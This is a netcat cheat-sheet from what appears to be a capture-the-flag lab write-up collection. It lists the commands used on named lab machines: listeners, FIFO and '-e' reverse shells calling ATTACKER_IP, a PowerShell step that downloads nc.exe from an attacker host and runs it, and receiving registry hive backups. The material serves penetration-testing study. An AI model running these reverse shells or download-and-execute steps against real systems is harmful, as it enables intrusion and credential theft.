# netcat (nc)

## Internal Commands

```bash
nc -lvnp 443
```
Used on: **Internal** - received the WordPress and Jenkins reverse shells.

## Wreath Commands

```bash
rlwrap nc -lvnp 4444
nc -lvnp 4444 > sam.bak
```
Used on: **Wreath** - received relayed shells and copied registry hive backups.

Swiss-army knife for TCP/UDP connections. In these writeups, primarily used as a reverse shell listener on the attacker side and as the stager inside reverse shell payloads.

## Commands Used

### Start a listener
```bash
nc -lvnp 4444
```
Used on: **Kobold**, **Silentium**, **CCTV**, **DevArea**

- `-l` — listen mode
- `-v` — verbose
- `-n` — no DNS resolution
- `-p` — port number

### FIFO-based reverse shell (Alpine with limited `nc`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
```
Used on: **Silentium** (Flowise MCP payload)

### Classic `-e` reverse shell
```bash
nc -e /bin/sh ATTACKER_IP PORT
```
Used on: **Silentium**, **CCTV**

### Reverse shell from inside Docker via exec
```bash
nc ATTACKER_IP 5555 -e /bin/sh
```
Used on: **MonitorsFour**

### Windows reverse shell via staged `nc.exe`
```bash
# Attacker — host the binary
cp /usr/share/windows-binaries/nc.exe .
python3 -m http.server 80
nc -lvnp 4444

# Target (via webshell) — pull + run
powershell -c "Invoke-WebRequest http://LHOST/nc.exe -OutFile C:\Windows\Temp\nc.exe"
C:\Windows\Temp\nc.exe LHOST 4444 -e cmd.exe
```
Used on: **Relevant** — delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
